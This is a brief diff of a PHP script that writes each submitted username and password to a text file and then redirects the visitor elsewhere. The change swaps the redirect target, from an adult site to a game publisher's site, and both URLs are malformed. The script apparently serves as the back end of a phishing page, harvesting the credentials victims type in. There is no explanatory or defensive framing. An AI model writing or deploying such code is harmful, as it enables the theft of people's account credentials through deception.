@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https;//pt.pornhub.com');
+header('Location: https;//https://www.activision.com');
 exit();
